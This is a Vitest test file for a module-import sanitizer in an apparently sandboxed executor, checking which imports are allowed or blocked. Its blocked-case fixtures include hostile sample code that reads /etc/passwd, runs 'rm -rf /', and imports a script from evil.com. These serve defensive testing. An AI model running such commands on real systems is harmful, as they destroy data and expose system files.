// tests/executor/import-validation.test.ts
import { describe, it, expect } from 'vitest'
import { sanitizeModuleCode } from '../../src/executor/sanitize.js'

describe('Import Validation', () => {
  describe('Allowed imports', () => {
    it('should allow esm.do imports', () => {
      const code = `import { add } from 'esm.do/@math/add';
export function double(n) { return add(n, n); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(true)
    })

    it('should allow relative imports within module', () => {
      const code = `import { helper } from './utils';
export function main() { return helper(); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(true)
    })
  })

  describe('Blocked imports', () => {
    it('should block Node.js built-in imports', () => {
      const code = `import fs from 'fs';
export function readFile() { return fs.readFileSync('/etc/passwd'); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('fs') || e.includes('blocked'))).toBe(true)
    })

    it('should block child_process imports', () => {
      const code = `import { exec } from 'child_process';
export function run() { exec('rm -rf /'); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
    })

    it('should block path imports', () => {
      const code = `import path from 'path';
export function getPath() { return path.resolve('/'); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
    })

    it('should block os imports', () => {
      const code = `import os from 'os';
export function getInfo() { return os.userInfo(); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
    })

    it('should block http/https imports', () => {
      const code = `import http from 'http';
export function server() { return http.createServer(); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
    })

    it('should block net imports', () => {
      const code = `import net from 'net';
export function connect() { return net.connect(22, 'localhost'); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
    })

    it('should block arbitrary npm packages', () => {
      const code = `import lodash from 'lodash';
export function chunk(arr) { return lodash.chunk(arr, 2); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some(e => e.includes('lodash') || e.includes('not allowed'))).toBe(true)
    })

    it('should block URL imports to external domains', () => {
      const code = `import malware from 'https://evil.com/malware.js';
export function attack() { return malware(); }`
      const result = sanitizeModuleCode(code)
      expect(result.valid).toBe(false)
    })
  })
})
